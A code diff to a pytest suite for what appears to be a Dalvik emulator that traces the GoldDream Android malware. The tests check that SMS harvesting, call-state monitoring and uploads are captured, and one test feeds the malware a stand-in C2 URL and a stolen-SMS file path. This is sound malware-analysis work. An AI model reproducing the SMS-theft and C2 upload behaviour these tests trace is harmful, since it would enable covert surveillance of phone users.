@@ -38,14 +38,11 @@ from pathlib import Path
 import pytest
 
 _FIXTURES = Path(__file__).parent / "fixtures"
-sys.path.insert(0, str(_FIXTURES))
 
-from golddream_fetcher import FetcherError, get_apk_path  # noqa: E402
-
-from dextrace.cli._io import load_dex_bytes  # noqa: E402
-from dextrace.core.dex_code_map import build_sig_to_codeoff_map  # noqa: E402
-from dextrace.core.dex_resolver import DexResolver  # noqa: E402
-from dextrace.vm.engine import DalvikVM  # noqa: E402
+from dextrace.cli._io import load_dex_bytes
+from dextrace.core.dex_code_map import build_sig_to_codeoff_map
+from dextrace.core.dex_resolver import DexResolver
+from dextrace.vm.engine import DalvikVM
 
 ON_RECEIVE = (
     "Lcom/sjhi/client/zjReceiver;"
@@ -56,6 +53,10 @@ E_A = "Lcom/sjhi/client/e;->a(Ljava/lang/String;Ljava/lang/String;)V"
 
 @pytest.fixture(scope="module")
 def golddream_vm():
+    if str(_FIXTURES) not in sys.path:
+        sys.path.insert(0, str(_FIXTURES))
+    from golddream_fetcher import FetcherError, get_apk_path  # noqa: PLC0415
+
     try:
         apk_path = get_apk_path()
     except FetcherError as exc:
@@ -75,11 +76,21 @@ class TestThreat1MonitorSms:
             args=["", 0, "android.provider.Telephony.SMS_RECEIVED"],
         )
         apis = [c["api"] for c in vm.api_calls]
-        assert any("createFromPdu" in a for a in apis), "SmsMessage.createFromPdu not captured"
-        assert any("getOriginatingAddress" in a for a in apis), "getOriginatingAddress not captured"
-        assert any("getDisplayMessageBody" in a for a in apis), "getDisplayMessageBody not captured"
-        assert any("getTimestampMillis" in a for a in apis), "getTimestampMillis not captured"
-        assert any("openFileOutput" in a for a in apis), "openFileOutput not captured"
+        assert any(
+            "createFromPdu" in a for a in apis
+        ), "SmsMessage.createFromPdu not captured"
+        assert any(
+            "getOriginatingAddress" in a for a in apis
+        ), "getOriginatingAddress not captured"
+        assert any(
+            "getDisplayMessageBody" in a for a in apis
+        ), "getDisplayMessageBody not captured"
+        assert any(
+            "getTimestampMillis" in a for a in apis
+        ), "getTimestampMillis not captured"
+        assert any(
+            "openFileOutput" in a for a in apis
+        ), "openFileOutput not captured"
 
     def test_call_state_trace(self, golddream_vm):
         vm = golddream_vm
@@ -88,8 +99,12 @@ class TestThreat1MonitorSms:
             args=["", 0, "android.intent.action.PHONE_STATE"],
         )
         apis = [c["api"] for c in vm.api_calls]
-        assert any("getCallState" in a for a in apis), "TelephonyManager.getCallState not captured"
-        assert any("getSystemService" in a for a in apis), "Context.getSystemService not captured"
+        assert any(
+            "getCallState" in a for a in apis
+        ), "TelephonyManager.getCallState not captured"
+        assert any(
+            "getSystemService" in a for a in apis
+        ), "Context.getSystemService not captured"
 
 
 class TestThreat2UploadToServer:
@@ -102,8 +117,18 @@ class TestThreat2UploadToServer:
             args=["http://c2.example.com/upload", "/data/zjsms.txt"],
         )
         apis = [c["api"] for c in vm.api_calls]
-        assert any("openConnection" in a for a in apis), "URL.openConnection not captured"
-        assert any("setRequestMethod" in a for a in apis), "setRequestMethod not captured"
-        assert any("getOutputStream" in a for a in apis), "getOutputStream not captured"
-        assert any("writeBytes" in a for a in apis), "DataOutputStream.writeBytes not captured"
-        assert any("read" in a for a in apis), "FileInputStream.read not captured"
+        assert any(
+            "openConnection" in a for a in apis
+        ), "URL.openConnection not captured"
+        assert any(
+            "setRequestMethod" in a for a in apis
+        ), "setRequestMethod not captured"
+        assert any(
+            "getOutputStream" in a for a in apis
+        ), "getOutputStream not captured"
+        assert any(
+            "writeBytes" in a for a in apis
+        ), "DataOutputStream.writeBytes not captured"
+        assert any(
+            "read" in a for a in apis
+        ), "FileInputStream.read not captured"
